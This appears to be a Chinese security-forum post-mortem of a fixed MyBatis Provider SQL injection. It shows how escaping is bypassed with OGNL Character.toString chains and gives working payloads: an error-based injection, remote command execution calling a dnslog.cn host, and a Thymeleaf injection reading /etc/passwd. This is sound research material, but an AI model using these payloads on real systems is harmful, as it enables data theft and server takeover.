0x00 背景
=======

 Mybatis是java生态中比较常见的持久层框架。在MyBatis3开始提供了使用Provider注解指定某个工具类的方法来动态编写SQL。常见的注解有：

- @SelectProvider
- @InsertProvider
- @UpdateProvider
- @DeleteProvider

 跟所有ORM框架一样，若使用不当，会存在SQL注入风险。（只要是通过SQL拼接，都会存在风险。）

 在实际业务中发现一处Provider注入的case，**当前漏洞已经修复完毕** 。提取关键的的漏洞代码做下复盘。

 查看mapper代码，可以看到name参数直接通过SQL拼接的方式进行查询，如果用户可控的话，会存在SQL注入风险：

```Java
@SelectProvider(type = UserProvider.class, method = "getUserByName")
List<User> getUserByName(String name);

class UserProvider {
    public String getUserByName(String name) {
        String s = new SQL() {
            {
                SELECT("*");
                FROM("users");
                WHERE("username like'%"+name+"%'");
            }
        }.toString();
        return s;
    }
}
```

 回溯对应的参数传递过程，发现name参数经过了如下函数的处理：

```Java
MySQLCodec.v().encode(sql)
```

 跟进具体的代码，核心处理代码如下，该方法是根据ESAPI魔改的方法，会对参数进行编码转译处理，规避SQL注入的风险：

```Java
private String encodeCharacterMySQL( Character c ) {
      char ch = c.charValue();
      if ( ch == 0x00 ) return "\\0";
      if ( ch == 0x08 ) return "\\b";
      if ( ch == 0x09 ) return "\\t";
      if ( ch == 0x0a ) return "\\n";
      if ( ch == 0x0d ) return "\\r";
      if ( ch == 0x1a ) return "\\Z";
      if ( ch == 0x22 ) return "\\\"";
      if ( ch == 0x27 ) return "\\'";
      if ( ch == 0x5c ) return "\\\\";
      return ""+c;
   }
```

 存在注入点的地方为like模糊查询，经过encode()处理后单引号被转义，没办法闭合SQL上下文，无法利用。那么有没有办法可以绕过对应的安全过滤处理成功利用呢？下面是具体的思考过程：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-5a6704ac279268758d08367865e971d3d4e28e2e.png)

0x01 绕过过程
=========

 实际上MyBatis 默认是支持OGNL 表达式的，尤其是在动态SQL中，通过OGNL 表达式可以灵活的组装 SQL 语句，从而完成更多的功能。

 而Provider注解是可以自定义SQL的过程。可以简单的类比为动态生成了一个xml mapper配置。如果定义的SQL中包含${}，拼接成SQL后会调用DynamicSqlSource通过OgnlCache进行相应的解析。也就是说**上述场景是支持OGNL表达式解析的** 。（具体可见之前的文章，传送门[：https://forum.butian.net/share/1749）](https://forum.butian.net/share/1749)

 但是有个问题是，即使支持OGNL的解析，Java的函数调用传入参数也需要用到单双引号，`MySQLCodec.` *`v`* `().encode()`方法同样的做了相应的转义处理。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-9d1188976a0a371a5250edf59af0853d73e46dc3.png)

 比起之前只能围绕单双引号困扰，能执行OGNL的话就比较灵活了，可以看看有什么 **单双引号的替代方案** 。

 先看看有什么字符是必要的，`{}`是必要的，是mybaits进入OGNL解析的入口，其次OGNL表达式的格式如下，那么`@`也是必要的。

```text
@[类全名（包括包路径）]@[方法名 |  值名]
```

 如果能解决单双引号的转义问题，在SQL注入的基础上，也能进一步调用OGNL对应执行命令的方法，达到RCE的效果。

0x02 Unicode编码
==============

 比较容易想到的思路就是编码，能不能通过编码的方式进行混淆，骗过转义机制。

 ognl表达式支持\\u这种编码形式。例如如下两个表达式其实都是等价的，返回的结果都是字符串`1`：

```text
\u0040\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0053\u0074\u0072\u0069\u006e\u0067\u0040\u0076\u0061\u006c\u0075\u0065\u004f\u0066\u0028\u0031\u0029

@java.lang.String@valueOf(1)
```

 可以通过Unicode编码单双引号来绕过对应的转义过程，但是`\`同样的会经过转义处理，导致对应的表达式无法执行。

```java
if ( ch == 0x5c ) return "\\\\";
```

0x03 ASCII码
===========

 除此之外，ASCII转换字符串也是一个不错的思路。  
 在Java中，char与int两者是支持相加减的。在运算时，int取本身数值，char取对应的ASCII码值。得到的结果是ASCII码增加/减小int对应的数值大小。

 如果结果赋值给char类型的变量即是该ASCII码对应的字符，如果赋值给int类型的变量即是该ASCII码的大小。

 例如下面的例子，d的ascii码为100:

```Java
public static void main(String[] args){
   char str = 'd'-3;
   System.out.println(str);//100-3=97，赋值给了char类型，所以输出ASCII码97对应的字符a

   int i = 'd'-3;
   System.out.println(i);//赋值给了int类型，所以输出对应的数字97
}
```

 那么可以考虑首先获取到一个char类型的变量，然后通过加法运算后，再进而转换为对应ASCII码对应的字符。

 对应的OGNL表达式，执行后获取的内容为`a`:

```Java
@java.lang.Character@toString(@java.lang.String@valueOf(0).charAt(0)+97)
```

 实际上只需要调用`Character.toString()`即可达到类似的效果了，对应的ognl表达式：

```Java
@java.lang.Character@toString(111)
```

 根据上面的思路，可以通过`Character.toString()`方法得到单个的字符串，那么只需要对这些字符串进行拼接，即可达到想要的内容了，整个过程是不需要使用到单双引号的。接下来验证对应的猜想。

- SQL注入

 根据漏洞代码，输入单引号正常应该是会影响sql上下文导致报错的，但是因为通过MySQLCodec.*v*().encode()转义，单引号会被认为是普通查询的字符串：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-e9b6014ce5ef54b2211aafc50c3e358b3cac4ef6.png)

 按照前面的思路，这里通过ognl构造一个单引号进行查询，可以看到成功绕过了转义机制，实际sql查询时影响了上下文，导致报错：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-1e9e280cea0762519b479fbbd63fdf75cd67c314.png)

 同理，这里以报错注入为例，构造sql语句`'and updatexml(1,concat(0x7e,user()),1) or '1'='1`,经过一系列的转换最终得到poc，可以查看成功通过报错注入得到了数据库用户名：

```Java
@java.lang.Character@toString(39)+@java.lang.Character@toString(97)+@java.lang.Character@toString(110)+@java.lang.Character@toString(100)+@java.lang.Character@toString(32)+@java.lang.Character@toString(117)+@java.lang.Character@toString(112)+@java.lang.Character@toString(100)+@java.lang.Character@toString(97)+@java.lang.Character@toString(116)+@java.lang.Character@toString(101)+@java.lang.Character@toString(120)+@java.lang.Character@toString(109)+@java.lang.Character@toString(108)+@java.lang.Character@toString(40)+@java.lang.Character@toString(49)+@java.lang.Character@toString(44)+@java.lang.Character@toString(99)+@java.lang.Character@toString(111)+@java.lang.Character@toString(110)+@java.lang.Character@toString(99)+@java.lang.Character@toString(97)+@java.lang.Character@toString(116)+@java.lang.Character@toString(40)+@java.lang.Character@toString(48)+@java.lang.Character@toString(120)+@java.lang.Character@toString(55)+@java.lang.Character@toString(101)+@java.lang.Character@toString(44)+@java.lang.Character@toString(117)+@java.lang.Character@toString(115)+@java.lang.Character@toString(101)+@java.lang.Character@toString(114)+@java.lang.Character@toString(40)+@java.lang.Character@toString(41)+@java.lang.Character@toString(41)+@java.lang.Character@toString(44)+@java.lang.Character@toString(49)+@java.lang.Character@toString(41)+@java.lang.Character@toString(32)+@java.lang.Character@toString(111)+@java.lang.Character@toString(114)+@java.lang.Character@toString(32)+@java.lang.Character@toString(39)+@java.lang.Character@toString(49)+@java.lang.Character@toString(39)+@java.lang.Character@toString(61)+@java.lang.Character@toString(39)+@java.lang.Character@toString(49)
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-12031f2f320aa93dcf51952f0b3472ff0b6c755a.png)

- RCE

 这里结合dnslog进行验证，尝试执行`curl` `28knso.dnslog.cn`命令，经过上述思路，得到的ongl表达式为：

```Java
@java.lang.Runtime@getRuntime().exec(@java.lang.Character@toString(99)+@java.lang.Character@toString(117)+@java.lang.Character@toString(114)+@java.lang.Character@toString(108)+@java.lang.Character@toString(32)+@java.lang.Character@toString(50)+@java.lang.Character@toString(56)+@java.lang.Character@toString(107)+@java.lang.Character@toString(110)+@java.lang.Character@toString(115)+@java.lang.Character@toString(111)+@java.lang.Character@toString(46)+@java.lang.Character@toString(100)+@java.lang.Character@toString(110)+@java.lang.Character@toString(115)+@java.lang.Character@toString(108)+@java.lang.Character@toString(111)+@java.lang.Character@toString(103)+@java.lang.Character@toString(46)+@java.lang.Character@toString(99)+@java.lang.Character@toString(110))
```

 发起reques请求，结合dnslog成功验证：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-dcb503cec5ef588baab958de1f877b36bb0a013e.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-44f4ab912e68025940771915c35ef918427f3853.png)

0x04 其他
=======

 能直接通过OGNL执行命令当然最好了，如果有相关限制没办法达到目的的话，单纯的利用SQL注入也是一个不错的选择。

 除了上述的思路，还可以对poc进行更多的变形，假设+号无法使用的话，实际上可以利用concact方法来完成字符串的拼接，对应的ognl如下，最终得到的是字符串ll：

```Java
@java.lang.Character@toString(108).concat(@java.lang.Character@toString(108))
```

 同样的,假设Character不可用，还可以通过字节转换来构造：

```java
new java.lang.String(new byte[]{97})
```

 同样的思路也可以用在Thymeleaf模板注入中，例如执行cat命令：

```Java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```